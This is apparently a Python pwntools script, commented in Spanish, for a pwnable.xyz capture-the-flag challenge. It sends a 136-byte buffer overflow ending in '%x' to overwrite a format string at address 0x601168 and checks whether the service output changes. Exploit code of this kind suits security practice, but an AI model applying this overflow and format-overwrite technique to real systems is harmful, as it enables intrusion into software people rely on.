#!/usr/bin/env python3

from pwn import *

conn = remote('svc.pwnable.xyz', 30004)

conn.recvuntil(b'[y/N]: ')
conn.sendline(b'y')

conn.recvuntil(b'Name: ')

# Sobrescribir 0x601168 (el formato "%s\n")
# Offset: 136 bytes desde usr

# Payload: 136 bytes + nuevo formato
# Nuevo formato: "%x" (imprime hex)
payload = b'E' * 136 + b'%x'

log.info(f"Enviando {len(payload)} bytes...")

conn.sendline(payload)

data = conn.recvall(timeout=3)
log.info(f"Respuesta:\n{data}")

# Si el formato cambió, debería ver hex en lugar de la string
if b'Welcome' in data and b'EEEE' not in data:
    log.success("¡El formato cambió! Veo algo diferente")

conn.close()